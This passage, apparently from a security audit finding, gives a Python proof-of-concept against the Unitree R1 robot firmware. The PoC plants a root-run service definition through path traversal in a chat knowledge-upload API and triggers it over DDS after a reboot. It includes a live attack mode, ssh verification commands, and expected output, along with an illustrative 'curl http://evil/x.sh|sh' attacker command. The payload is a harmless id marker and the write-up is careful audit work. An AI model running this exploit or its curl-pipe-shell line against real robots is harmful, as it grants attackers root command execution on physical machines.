+  cross-generation loader evidence for the enumeration hop and the Leg-B fire message.
+--mode dds (live robot): Leg A (the write) + Leg B (the post-reboot StartService fire).
+"""
+import argparse, ast, json, os, re, shutil, sys, tempfile
+
+CM = "/data/lt/audit/unitree/r1/real_unitree_r1_1.4.2/module/chat_go/g1/config_manager.py"
+LOGDIR = "/data/lt/audit/unitree/r1/real_unitree_r1_1.4.2/var/log/master_service"
+SERVICE_DIR = "/unitree/etc/master_service/service"       # 0777 dir, 27 extensionless defs
+MARKER = "/tmp/poc_msvc_plant"
+
+UID = "../../../../etc/master_service/service/pwn"        # 4 hops (R13-corrected)
+
+def service_json(cmd):                                    # same shape as .../service/bashrunner
+    return json.dumps({"Start": {"Cmd": cmd, "ExpectCode": [0]},
+                       "Stop":  {"Cmd": "true", "ExpectCode": [0, 1]},
+                       "Status": {"Cmd": "true", "AliveCode": [0], "DeadCode": [1, 3]}},
+                      indent=4)
+
+def verbatim_cm():
+    """ConfigManager.add_knowledge/save_knowledge/_get_knowledge_file, AST-extracted
+    unchanged from the shipped module, bound to a minimal self."""
+    cls = [n for n in ast.parse(open(CM).read()).body
+           if isinstance(n, ast.ClassDef) and n.name == "ConfigManager"][0]
+    keep = [n for n in cls.body if isinstance(n, ast.FunctionDef)
+            and n.name in {"add_knowledge", "save_knowledge", "_get_knowledge_file"}]
+    ns = {"os": os, "glob": __import__("glob"), "json": json}
+    exec(compile(ast.Module(body=keep, type_ignores=[]), "<verbatim config_manager.py>", "exec"), ns)
+    return ns
+
+def offline(_a):
+    root = tempfile.mkdtemp(prefix="poc-msvc-")
+    sdir = os.path.join(root, "unitree/etc/master_service/service")   # 0777 on the robot
+    os.makedirs(sdir, exist_ok=True); os.chmod(sdir, 0o777)
+    kdir = os.path.join(root, "unitree/robot/config/chat_go/knowledge")
+    os.makedirs(kdir, exist_ok=True)
+    cm = verbatim_cm()
+    class Self:                                    # minimal ConfigManager instance
+        knowledge_dir_ = kdir
+        knowledge_config_ = []
+    Self.save_knowledge = cm["save_knowledge"]
+    Self._get_knowledge_file = cm["_get_knowledge_file"]
+
+    payload = service_json(f"id > {MARKER} 2>&1")  # harmless marker; Cmd runs via system()
+    print(f"[+] LEG A  rt/api/gpt/request api 1006  uid={UID!r}")
+    print(f"    parameter = {[{'uid': UID, 'content': payload}][:1]}")
+    cm["add_knowledge"](Self(), [{"uid": UID, "content": payload}])   # runs as root on robot
+    planted = os.path.join(sdir, "pwn.md")
+    print(f"    -> wrote {planted} ({os.path.getsize(planted)} B); sandbox dir mode "
+          f"{oct(os.stat(sdir).st_mode & 0o777)} (robot ships 0777, defs 0666)")
+    print("    planted Start.Cmd master_service will system():",
+          json.loads(open(planted).read())["Start"]["Cmd"])
+
+    print("\n[+] LOADER EVIDENCE (LoadServiceAll body is Virbox-virtualized — unreadable;")
+    print("    the enumeration claim is INFERRED from the shipped logs):")
+    for tag, path, n in (("LOG.1 (prev fw, 2026-03)", f"{LOGDIR}/master_service.LOG.1", 26),
+                         ("LOG   (1.4.2, 2026-07)",   f"{LOGDIR}/master_service.LOG",   27)):
+        blk = open(path).read().split("load child service config size:")[1]
+        loaded = re.findall(r"load child service sucess\. name:(\S+)", blk)[:n]
+        print(f"    {tag}: 'load child service config size:{n}' == {n} files in that "
+              f"generation's dir; loaded names == filenames verbatim")
+    print("    LOG.1 loads dex3_service_l/r + r1_stereo_patch_pc1 (absent from the 1.4.2")
+    print("    dir) and lacks stereo_patch_pc1/system_journal/video_hub/videohub_rtsp_server")
+    print("    (present in it): 26 - 3 + 4 = 27 — the loaded set TRACKS THE DIRECTORY")
+    print("    across two firmware generations. No extension filter is observable anywhere.")
+    print("    WEAK-HOP: a name filter that rejects '.' would still fit all observed data;")
+    print("    falsifier = one live `mscli startservice pwn.md` after planting, or the")
+    print("    boot log reading 'load child service config size:28' + 'name:pwn.md'.")
+
+    print("\n[+] ARM  reboot the robot (LoadServiceAll at master_service Init)")
+    print("[+] LEG B (post-reboot)  rt/api/robot_state/request api 1001")
+    print('    parameter = {"name":"pwn.md","switch":1}   -> RPCServiceSwitch@0x5034c0')
+    print("    -> SwitchServiceLocal@0x50856c -> MSClient::StartService('pwn.md')")
+    print("    -> master_service ExecuteServiceStart -> system(Start.Cmd) as root")
+    if os.path.exists(MARKER):
+        print("    marker:", open(MARKER).read().strip())
+    shutil.rmtree(root)
+
+if __name__ == "__main__":
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--mode", choices=["offline", "dds"], default="offline")
+    a = ap.parse_args()
+    if a.mode == "offline":
+        offline(a); sys.exit(0)
+    from cyclonedds.domain import DomainParticipant
+    from cyclonedds.topic import Topic
+    from cyclonedds.pub import DataWriter
+    from unitree_api.msg.dds_ import (Request_, RequestHeader_, RequestIdentity_,
+                                      RequestLease_, RequestPolicy_)
+    dp = DomainParticipant(0)          # chat_go's reader has no QoS -> default writer matches
+    gpt = DataWriter(dp, Topic(dp, "rt/api/gpt/request", Request_))
+    rs = DataWriter(dp, Topic(dp, "rt/api/robot_state/request", Request_))
+    payload = service_json(f"id > {MARKER} 2>&1")
+    gpt.write(Request_(header=RequestHeader_(          # LEG A — the write
+        identity=RequestIdentity_(id=1006, api_id=1006),  # api_id IS the dispatcher
+        lease=RequestLease_(0), policy=RequestPolicy_(0, False)),
+        parameter=json.dumps([{"uid": UID, "content": payload}]), binary=[0]))
+    print(f"[+] LEG A sent: uid={UID!r} -> /unitree/etc/master_service/service/pwn.md")
+    print("[+] ARM: reboot the robot, then check the WEAK-HOP:")
+    print("    grep 'load child service config size' /unitree/var/log/master_service/master_service.LOG")
+    print("    -> 28 (and a 'load child service sucess. name:pwn.md' line) = hop CONFIRMED;")
+    print("       still 27 = a name filter exists = hop FALSIFIED")
+    rs.write(Request_(header=RequestHeader_(            # LEG B — the fire
+        identity=RequestIdentity_(id=1001, api_id=1001),
+        lease=RequestLease_(0), policy=RequestPolicy_(0, False)),
+        parameter=json.dumps({"name": "pwn.md", "switch": 1}), binary=[0]))
+    print("[+] LEG B sent: RPCServiceSwitch {'name':'pwn.md','switch':1}")
+    print("    -> MSClient::StartService('pwn.md') -> system('id > /tmp/poc_msvc_plant') as root")
+    print(f"[+] verify on robot: cat {MARKER}; cleanup: rm {MARKER} "
+          f"/unitree/etc/master_service/service/pwn.md")
+```
+
+### Usage
+
+```bash
+python3 poc_msvc_service_plant.py --mode offline       # harmless: write replay + evidence
+python3 poc_msvc_service_plant.py --mode dds           # LEG A + LEG B (needs the reboot between)
+ssh root@<robot> "grep 'load child service config size' \
+    /unitree/var/log/master_service/master_service.LOG"   # 27 -> 28 = WEAK-HOP confirmed
+ssh root@<robot> "cat /tmp/poc_msvc_plant"                # uid=0 ... = root exec confirmed
+```
+
+### Expected output (offline)
+
+```
+[+] LEG A  rt/api/gpt/request api 1006  uid='../../../../etc/master_service/service/pwn'
+    -> wrote /tmp/poc-msvc-…/unitree/etc/master_service/service/pwn.md (382 B); sandbox dir mode 0o777 (robot ships 0777, defs 0666)
+    planted Start.Cmd master_service will system(): id > /tmp/poc_msvc_plant 2>&1
+
+[+] LOADER EVIDENCE (LoadServiceAll body is Virbox-virtualized — unreadable;
+    the enumeration claim is INFERRED from the shipped logs):
+    LOG.1 (prev fw, 2026-03): 'load child service config size:26' == 26 files in that generation's dir; loaded names == filenames verbatim
+    LOG   (1.4.2, 2026-07): 'load child service config size:27' == 27 files in that generation's dir; loaded names == filenames verbatim
+    LOG.1 loads dex3_service_l/r + r1_stereo_patch_pc1 (absent from the 1.4.2
+    dir) and lacks stereo_patch_pc1/system_journal/video_hub/videohub_rtsp_server
+    (present in it): 26 - 3 + 4 = 27 — the loaded set TRACKS THE DIRECTORY
+    across two firmware generations. No extension filter is observable anywhere.
+    WEAK-HOP: a name filter that rejects '.' would still fit all observed data; ...
+[+] ARM  reboot the robot (LoadServiceAll at master_service Init)
+[+] LEG B (post-reboot)  rt/api/robot_state/request api 1001
+    parameter = {"name":"pwn.md","switch":1}   -> RPCServiceSwitch@0x5034c0
+    -> SwitchServiceLocal@0x50856c -> MSClient::StartService('pwn.md')
+    -> master_service ExecuteServiceStart -> system(Start.Cmd) as root
+```
+
+### The WEAK-HOP, stated plainly
+
+master_service is fully Virbox-virtualized (44,408/45,270 FUNC symbols are trampolines
+into runtime-decrypted `.bss`), so `LoadServiceAll`'s body cannot be read and the
+"`.md`-named file loads as a service" step is **not** instruction-verified. It rests on
+the R13 cross-generation log comparison reproduced above: the loaded count equals the
+directory file count in **both** generations (26 in the 2026-03 log / 27 in the 2026-07
+log), the loaded name set differs exactly as the directory contents differ
+(`dex3_service_l/r`, `r1_stereo_patch_pc1` out; `stereo_patch_pc1`, `system_journal`,
+`video_hub`, `videohub_rtsp_server` in), and the service JSONs carry no `Name` field
+(checked on `stereo_patch_pc1`), so the service name is necessarily the filename. That
+is directory enumeration, not a fixed list — but a hypothetical name filter that accepts
+every shipped extensionless name while rejecting `.`-containing names is still consistent
+with all observed data. Falsifiers, either of which settles it in one shot: (a) the boot
+log reading `load child service config size:28` with a `name:pwn.md` line after Leg A, or
+(b) one live `mscli startservice pwn.md` on a planted definition. Until one is run, the
+`.md`-load hop stays labeled WEAK-HOP. Note the local half of this finding needs none of
+it: the directory is 0777 with all 27 plaintext Cmd definitions 0666, so any local uid
+can simply rewrite `bashrunner`/`robot_state`/`ota_box` in place (no traversal, no
+`.md` suffix question, no reboot if the service is merely restarted).
+
+### Harmless-PoC scoping
+
+`Start.Cmd` is `id > /tmp/poc_msvc_plant 2>&1` (a uid marker, no network fetch, no
+persistence beyond the two artifact files) and the PoC prints the exact cleanup command.
+The illustrative `curl http://evil/x.sh|sh` Cmd in the finding's Data Flow is the
+attacker's shape, not the PoC's.
